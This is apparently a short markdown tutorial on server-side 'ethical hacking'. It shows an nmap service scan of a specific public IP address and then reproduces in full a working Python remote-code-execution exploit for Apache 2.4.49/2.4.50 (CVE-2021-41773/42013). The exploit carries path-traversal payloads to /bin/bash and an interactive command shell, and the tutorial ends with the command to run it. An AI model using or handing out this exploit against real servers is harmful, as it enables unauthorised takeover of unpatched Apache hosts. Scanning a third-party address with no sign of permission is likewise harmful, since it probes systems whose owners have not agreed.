# Server side
Ethical Hacking- vulnerability scanning

## Tools
<hr>

* Skipfish
* Owasp Disrbuster
* Webslayer
* Nmap
* Nessus

### The first scanner we will use
Nmap
<hr>
to see the services running, launch nmap.

```bash
nmap -sV 145.14.145.161
```
output
```
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-04 22:50 WAT
Nmap scan report for 145.14.145.161
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE   VERSION
21/tcp  open  ftp?
80/tcp  open  http      awex
443/tcp open  ssl/https awex
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
You can retrieve the services that are running or go directly to retrieve them from the database.
<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>
<br><br>
<img src="side.png" width="100%">

Service:`http`

<img src="side1.png" width="100%">

* Download the python file exploit

<img src="side2.png" width="100%">

* Look the python file

```python
# Exploit Title: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)
# Date: 11/11/2021
# Exploit Author: Valentin Lobstein
# Vendor Homepage: https://apache.org/
# Version: Apache 2.4.49/2.4.50 (CGI enabled)
# Tested on: Debian GNU/Linux
# CVE : CVE-2021-41773 / CVE-2021-42013
# Credits : Lucas Schnell


#!/usr/bin/env python3
#coding: utf-8

import os
import re
import sys
import time
import requests
from colorama import Fore,Style


header = '''\033[1;91m
    
     ▄▄▄       ██▓███   ▄▄▄       ▄████▄   ██░ ██ ▓█████     ██▀███   ▄████▄  ▓█████ 
    ▒████▄    ▓██░  ██▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
    ▒██  ▀█▄  ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███      ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
    ░██▄▄▄▄██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄    ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
    ▓█   ▓██▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
    ▒▒   ▓▒█░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
    ▒   ▒▒ ░░▒ ░       ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
    ░   ▒   ░░         ░   ▒   ░         ░  ░░ ░   ░        ░░   ░ ░           ░ 
''' + Style.RESET_ALL


if len(sys.argv) < 2 :
    print( 'Use: python3 file.py ip:port ' )
    sys.exit()

def end():
    print("\t\033[1;91m[!] Bye bye !")
    time.sleep(0.5)
    sys.exit(1)

def commands(url,command,session):
    directory = mute_command(url,'pwd')
    user = mute_command(url,'whoami')
    hostname = mute_command(url,'hostname')
    advise = print(Fore.YELLOW + 'Reverse shell is advised (This isn\'t an interactive shell)')
    command = input(f"{Fore.RED}╭─{Fore.GREEN + user}@{hostname}: {Fore.BLUE + directory}\n{Fore.RED}╰─{Fore.YELLOW}$ {Style.RESET_ALL}")    
    command = f"echo; {command};"
    req = requests.Request('POST', url=url, data=command)
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    output = response.text
    print(output)
    if 'clear' in command:
        os.system('/usr/bin/clear')
        print(header)
    if 'exit' in command:
        end()

def mute_command(url,command):
    session = requests.Session()
    req = requests.Request('POST', url=url, data=f"echo; {command}")
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    return response.text.strip()


def exploitRCE(payload):
    s = requests.Session()
    try:
        host = sys.argv[1]
        if 'http' not in host:
            url = 'http://'+ host + payload
        else:
            url = host + payload 
        session = requests.Session()
        command = "echo; id"
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url  
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            choice = "Y"
            print( Fore.GREEN + '\n[!] Target %s is vulnerable !!!' % host)
            print("[!] Sortie:\n\n" + Fore.YELLOW + output )
            choice = input(Fore.CYAN + "[?] Do you want to exploit this RCE ? (Y/n) : ")
            if choice.lower() in ['','y','yes']:
                while True:
                    commands(url,command,session)  
            else:
                end()       
        else :
            print(Fore.RED + '\nTarget %s isn\'t vulnerable' % host)
    except KeyboardInterrupt:
        end()

def main():
    try:
        apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        payloads = [apache2449_payload,apache2450_payload]
        choice = len(payloads) + 1
        print(header)
        print("\033[1;37m[0] Apache 2.4.49 RCE\n[1] Apache 2.4.50 RCE")
        while choice >= len(payloads) and choice >= 0:
            choice = int(input('[~] Choice : '))
            if choice < len(payloads):
                exploitRCE(payloads[choice])
    except KeyboardInterrupt:
            print("\n\033[1;91m[!] Bye bye !")
            time.sleep(0.5)
            sys.exit(1)

if __name__ == '__main__':
    main()
            
```
## Let's to run file
```bash
python3 Explot.py
```